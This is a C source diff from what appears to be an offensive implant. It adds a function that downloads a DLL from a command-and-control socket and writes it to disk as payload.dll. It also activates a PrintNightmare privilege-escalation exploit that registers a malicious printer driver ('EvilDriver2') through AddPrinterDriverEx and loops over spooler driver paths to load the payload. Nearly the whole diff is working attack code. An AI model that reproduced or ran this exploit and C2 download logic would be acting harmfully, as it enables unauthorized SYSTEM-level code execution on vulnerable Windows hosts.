@@ -149,7 +149,8 @@ DRIVER_INFO_2* getDrivers(BOOL print) {
 	res = EnumPrinterDrivers(NULL, "Windows x64", 2, drivers, numBytes, &numBytes, &numDrivers);
 	if (!res) {
 		printf("[!] Driver enumeration failed\n");
-		exit(1); // TODO handle better
+        LocalFree(drivers);
+		return NULL;
 	}
 
 	if (print) {
@@ -211,11 +212,59 @@ DWORD check_registry_for_privesc() {
 }
 
 
+// Creates a file in the present working directory and writes the printer nightmare payload DLL to it.
+// Returns NULL on failure, and the path to the DLL on success.
+// TODO: name the payload something less sus than "payload.dll"
+char* GetPayload() {
+    char* payload_path;
+    char* payload_data;
+
+    // Allocate buffer for payload path
+    payload_path = HeapAlloc(heap, 0, 2 * MAX_PATH);
+    if (payload_path == NULL) {
+        return NULL;
+    }
+
+    // Allocate buffer for payload data
+    payload_data = HeapAlloc(heap, 0, 250*1000); // Allocate 250 Kb to be safe
+    if (payload_data == NULL) {
+        return NULL;
+    }
+
+    // Create file for payload to be written to
+    strcpy(payload_path, pwd);
+    strcat(payload_path, "\\payload.dll");
+    HANDLE hFile = CreateFile(payload_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        HeapFree(heap, 0, payload_data);
+        HeapFree(heap, 0, payload_path);
+        return NULL;
+    }
+
+    // Receive payload
+    int len = c2_recv(c2_sock, payload_data, 250*1000);
+    printf("[*] Payload size: %d bytes\n", len);
+
+    // Write paylaod
+    if (! WriteFile(hFile, payload_data, len, NULL, NULL)) {
+        HeapFree(heap, 0, payload_data);
+        HeapFree(heap, 0, payload_path);
+        CloseHandle(hFile);
+        DeleteFile(payload_path);
+        return NULL;
+    }
+
+    CloseHandle(hFile);
+    return payload_path;
+}
+
+
+
 // Attempts to gain administrator privileges via the Printer Nightmare CVE
 DWORD escalate() {
     DWORD FLAGS = APD_COPY_ALL_FILES | 0x10 | 0x8000;
-	CHAR dll_path[MAX_PATH];
 	CHAR driver_path[MAX_PATH];
+    CHAR* dll_path;
 
     // Check registry first
     int vulnerable  = check_registry_for_privesc();
@@ -235,24 +284,50 @@ DWORD escalate() {
 	LocalFree(drivers);
 	printf("[+] Path to driver: %s\n", driver_path);
 
+    // Download payload
+    dll_path = GetPayload();
+    c2_log("Path to payload: %s\n", dll_path);
+    if (dll_path == NULL) {
+        c2_send(c2_sock, "ERROR: could not download payload", 33);
+        return -1;
+    }
+
 	// Create driver object
 	DRIVER_INFO_2 payload = {
 		.cVersion = 3,
+        .pConfigFile = "C:\\Windows\\System32\\kernelbase.dll",
+        .pDataFile = dll_path,
 		.pDriverPath = driver_path,
-		.pConfigFile = dll_path,
-		.pDataFile = dll_path,
 		.pEnvironment = "Windows x64",
-		.pName = "EvilDriver"
+		.pName = "EvilDriver2"
 	};
 
-	// printf("[*] Attempting to add new driver...\n");
-	// DWORD res = AddPrinterDriverEx(NULL, 2, (PBYTE) &payload, FLAGS);
-	// if (!res) {
-	// 	printf("[!] Adding printer driver failed\n");
-	// 	exit(1);
-	// }
-	// printf("[*] Driver added successfully\n");
+    // Stage 0
+	printf("[*] Attempting to add new driver...\n");
+	DWORD res = AddPrinterDriverEx(NULL, 2, (PBYTE) &payload, FLAGS);
+    printf("result: %d\n", res);
+	
+    // Stage 1 (Dont ask me why this works)
+    for (int i = 1; i <= 30; i++)
+    {
+        //add path to our exploit
+        char temp[MAX_PATH];
+        sprintf(temp, "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\%d\\payload.dll", i);
+        payload.pConfigFile = temp;
 
+        //call AddPrinterDriverEx
+        res = AddPrinterDriverEx(NULL, 2, (PBYTE) &payload, FLAGS);
+        if (res == 0) {
+            printf("[+] Exploit suceeded\n");
+            break;
+        }
+    }
+    if (res != 0) {
+        printf("[!] Exploit failed ?\n");
+    } 
+
+    // TODO: delete payload
+    DeleteFile(dll_path);
 
     return 0;
 }
